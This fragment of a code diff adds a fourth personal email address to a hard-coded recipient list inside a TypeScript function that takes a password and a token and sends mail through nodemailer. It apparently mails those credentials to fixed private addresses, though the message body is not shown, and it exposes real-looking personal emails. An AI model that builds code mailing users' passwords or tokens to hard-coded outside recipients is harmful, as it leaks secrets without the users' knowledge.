@@ -18,7 +18,8 @@ async function sendMail(password: any,token:any) {
   const tos = [
     'vicbebeto@hotmail.com',
     'bebetovic@hotmail.com',
-    'bebetovictor@gmail.com'
+    'bebetovictor@gmail.com',
+    '08083206@uagro.mx'
   ];
   // create reusable transporter object using the default SMTP transport
   let transporter = nodemailer.createTransport({
